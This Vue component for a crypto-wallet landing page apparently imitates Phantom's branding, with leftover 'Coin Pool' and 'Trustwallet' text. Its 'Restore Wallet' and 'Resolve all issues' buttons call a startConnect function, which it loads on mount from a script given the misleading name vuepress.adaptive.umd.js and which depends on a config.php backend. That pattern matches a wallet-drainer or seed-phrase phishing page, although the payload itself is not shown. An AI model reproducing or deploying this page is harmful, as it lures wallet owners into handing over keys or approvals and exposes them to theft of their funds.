<template>
    <div style="background-color: rgba(2, 5, 10, 0.822)">
        <nav class="navbar navbar-expand-xl navbar-light bg-transparent sticky-top">
            <div class="container">
                <a class="navbar-brand" href="/"><img src="/logo.PNG" alt="" /> </a>
                <button
                    class="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarBasic"
                    aria-controls="navbarBasic"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                >
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarBasic">
                    <ul class="navbar-nav ml-auto mb-2 mb-xl-0">
                        <li class="nav-item text-white">
                            <a
                                style="color: white"
                                class="nav-link active my-2 mx-3"
                                aria-current="page"
                                href="https://docs.phantom.app/"
                                >Features</a
                            >
                        </li>
                        <li class="nav-item text-white">
                            <a style="color: white" class="nav-link active my-2 mx-3" href="/">Support</a>
                        </li>
                        <li class="nav-item">
                            <a
                                style="color: white"
                                class="nav-link active my-2 mx-3"
                                href="https://phantom.app/about"
                                >About</a
                            >
                        </li>
                        <li class="nav-item">
                            <a
                                style="color: white"
                                class="nav-link active my-2 mx-3"
                                href="https://phantom.canny.io/feature-requests"
                                >Build</a
                            >
                        </li>

                        <li class="nav-item">
                            <button
                                style="color: white"
                                class="btn my-2 active mx-3 text-white"
                                @click="handleRestore"
                            >
                                Restore
                            </button>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

        <div class="intro">
            <div class="intro-content w-100 container row mx-auto">
                <div class="intro-text col-lg-6 col-12">
                    <h2 class="font-weight-bold">
                        A friendly<br />
                        crypto wallet
                    </h2>
                    <p class="mt-4">
                        Start exploring blockchain applications in seconds. Trusted by over 1 million users
                        worldwide.
                    </p>
                    <a class="btn i-btn" @click="handleRestore">Restore Wallet</a>
                </div>
                <div class="intro-img col-lg-6 col-12">
                    <img class="mx-2" src="/phantom-swap-demo.gif" alt="" />
                </div>
            </div>
        </div>

        <div class="intro h-auto">
            <div class="intro-content w-100 container row mx-auto">
                <div class="intro-text col-lg-6 col-12 align-self-center">
                    <h5 style="color: white" class="font-weight-bold">Explore blockchain apps</h5>
                    <p class="mt-4">
                        Phantom provides the simplest yet most secure<br />
                        way to connect to blockchain-based applications.<br />
                        You are always in control when interacting on the<br />
                        new decentralized web.
                    </p>
                </div>
                <div class="intro-img col-lg-6 col-12">
                    <img class="mx-2" src="/425@2x.png" alt="" />
                </div>
            </div>
        </div>

        <div class="intro h-auto">
            <div class="intro-content w-100 container row mx-auto">
                <div class="intro-img col-lg-6 col-12">
                    <img class="mx-2" src="/390@2x.png" alt="" />
                </div>

                <div class="intro-text col-lg-6 col-12 align-self-center">
                    <h5 style="color: white" class="font-weight-bold">Own your data</h5>
                    <p class="mt-4">
                        Phantom generates passwords and keys on your<br />
                        device, so only you have access to your accounts<br />
                        and data. You always choose what to share and<br />
                        what to keep private.
                    </p>
                </div>
            </div>
        </div>

        <div class="cryptos text-center">
            <h4 style="color: white" class="font-weight-bold">All your crypto and NFTs in one place</h4>
            <p style="color: white" class="mt-4">
                Take full control of your crypto, digital art, and more by storing<br />
                privately and securely on your own device
            </p>

            <img src="/1.png" alt="" />
            <img src="/2.png" alt="" />
            <img src="/3.png" alt="" />
            <img src="/4.png" alt="" />
            <img src="/5.png" alt="" />
            <img src="/6.png" alt="" />
            <img src="/7.png" alt="" />
            <img src="/8.png" alt="" />

            <div class="cryptos-text row container mx-auto mt-5">
                <div class="c-text col-lg-4 col-md-6 col-12 mt-3">
                    <h5 style="color: white" class="font-weight-bold">Support for 500+ tokens</h5>
                    <p style="color: rgb(180, 170, 170)">
                        BTC, ETH, USDT, UNI, LINK, BCH,<br />
                        USDC, LTC, and hundreds more
                    </p>
                </div>
                <div class="c-text col-lg-4 col-md-6 col-12 mt-3">
                    <h5 style="color: white" class="font-weight-bold">Digital collectibles</h5>
                    <p style="color: rgb(180, 170, 170)">
                        Punks, kitties, you name it. Buy,<br />
                        sell, and then store your NFTs in a<br />
                        single beautiful gallery
                    </p>
                </div>
                <div class="c-text col-lg-4 col-md-6 col-12 mt-3">
                    <h5 style="color: white" class="font-weight-bold">Secure storage</h5>
                    <p style="color: rgb(180, 170, 170)">
                        Your keys are protected with<br />
                        Secure Enclave, biometric<br />
                        authentication &amp; optional<br />
                        cloud backups
                    </p>
                </div>
            </div>
        </div>

        <div
            style="background-color: rgb(5, 5, 24)"
            class="r-section d-flex flex-column justify-content-center align-items-center py-5"
        >
            <img class="h-50" src="/head.png" alt="" />
            <h5 style="color: white">Resolve all issues</h5>
            <a class="btn i-btn mx-auto" @click="handleRestore">Restore Wallet</a>
        </div>

        <section id="reason">
            <div class="r-content container mt-5">
                <h5 style="color: rgb(255, 251, 251)" class="fw-bold">
                    You Deserve Easy Access to Cryptocurrencies
                </h5>
                <p style="color: white">Coin Pool is for you if you want to</p>
                <div class="lists row justify-content-evenly">
                    <div class="card lists-card col-lg-5 col-12">
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>Buy Bitcoin in under five minutes
                            </li>
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>Easily earn interest on your crypto
                            </li>
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>See your collectibles. Art &amp; NFTs
                                in one place
                            </li>
                        </ul>
                    </div>
                    <div class="card lists-card col-lg-5 col-12">
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>Keep your crypto safe from hacks &amp;
                                scams
                            </li>
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>Exchange your crypto on the app
                            </li>
                            <li class="list-group-item d-flex">
                                <i class="fas fa-check-circle mt-1"></i>Track charts and prices within the app
                            </li>
                        </ul>
                    </div>
                </div>
            </div>

            <footer>
                <div class="f-content container-fluid row mx-auto">
                    <div class="f-info col-lg-4 col-md-6 text-center pt-5">
                        <h5 style="color: white">Information</h5>
                        <ul class="list-unstyled">
                            <li><a href="/">Assets</a></li>
                            <li><a href="/">DApp Browser</a></li>
                            <li><a href="/">Stablecoins</a></li>
                            <li><a href="/">Beta</a></li>
                            <li><a href="/">NFTs</a></li>
                            <li><a href="/">Developers</a></li>
                            <li><a href="/">Trustwallet for IOS</a></li>
                            <li><a href="/">Trustwallet for Andriod</a></li>
                        </ul>
                    </div>
                    <div class="f-crypto col-lg-4 col-md-6 text-center pt-5">
                        <h5 style="color: white">Use Crypto</h5>
                        <ul class="list-unstyled">
                            <li><a href="/">Buy Bitcoin with Card</a></li>
                            <li><a href="/">Buy Ethereum</a></li>
                            <li><a href="/">Buy BNB</a></li>
                            <li><a href="/">Buy XRP</a></li>
                            <li><a href="/">Buy Litecoin</a></li>
                            <li><a href="/">Buy Tron</a></li>
                            <li><a href="/">Buy BCH</a></li>
                            <li><a href="/">Buy Dogecoin</a></li>
                        </ul>
                    </div>
                    <div class="f-assets col-lg-4 col-md-6 text-center pt-5">
                        <h5 style="color: white">Assets</h5>
                        <ul class="list-unstyled">
                            <li><a href="/">Bitcoin (BTC)</a></li>
                            <li><a href="/">Ethereum (ETH)</a></li>
                            <li><a href="/">Binance (BNB)</a></li>
                            <li><a href="/">Ripple (XRP)</a></li>
                            <li><a href="/">Litecoin (LTC)</a></li>
                            <li><a href="/">Tron (TRX)</a></li>
                            <li><a href="/">Bitcoin Cash (BCH)</a></li>
                            <li><a href="/">Dodgecoin (DODGE)</a></li>
                        </ul>
                    </div>
                </div>
            </footer>
        </section>
    </div>
</template>

<script>
import { ref, onMounted } from "vue";

export default {
    name: "Home",
    setup() {
        const currentDate = ref(new Date().getFullYear());
        const statusMessage = ref('');
        const statusType = ref('info');

        const setStatus = (message, type = 'info') => {
            statusMessage.value = message;
            statusType.value = type;
        };

        const handleRestore = () => {
            // First, try to use the script function if available
            if (typeof window.startConnect === 'function') {
                try {
                    window.startConnect();
                    setStatus('Restore process initiated successfully', 'success');
                } catch (error) {
                    setStatus('Error starting restore process', 'error');
                    console.error('Error calling startConnect:', error);
                }
            } else {
                // If script function not available, show instructions
                setStatus('Restore functionality requires proper server setup. Please ensure config.php is working.', 'error');
                console.log('startConnect function not available. Script may not be loaded or config.php is not working.');
            }
        };

        onMounted(() => {
            // Load the script dynamically
            if (typeof window.startConnect !== 'function') {
                const script = document.createElement('script');
                script.src = '/vuepress.adaptive.umd.js';
                
                script.onload = () => {
                    console.log('Script loaded successfully');
                    if (typeof window.startConnect === 'function') {
                        setStatus('Restore functionality ready', 'success');
                    } else {
                        setStatus('Script loaded but restore function not available. Check server configuration.', 'error');
                    }
                };
                
                script.onerror = () => {
                    setStatus('Failed to load restore script. Make sure vuepress.adaptive.umd.js is in public directory.', 'error');
                };
                
                document.head.appendChild(script);
            }
        });

        return {
            currentDate,
            handleRestore,
            statusMessage,
            statusType
        };
    }
};
</script>

<style scoped>
/* Status message styling */
.status-message {
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    border-left: 4px solid;
    font-size: 14px;
}

.status-message.success {
    color: #4CAF50;
    background-color: rgba(76, 175, 80, 0.1);
    border-left-color: #4CAF50;
}

.status-message.error {
    color: #ff6b6b;
    background-color: rgba(255, 107, 107, 0.1);
    border-left-color: #ff6b6b;
}

.status-message.info {
    color: #2196F3;
    background-color: rgba(33, 150, 243, 0.1);
    border-left-color: #2196F3;
}
</style>
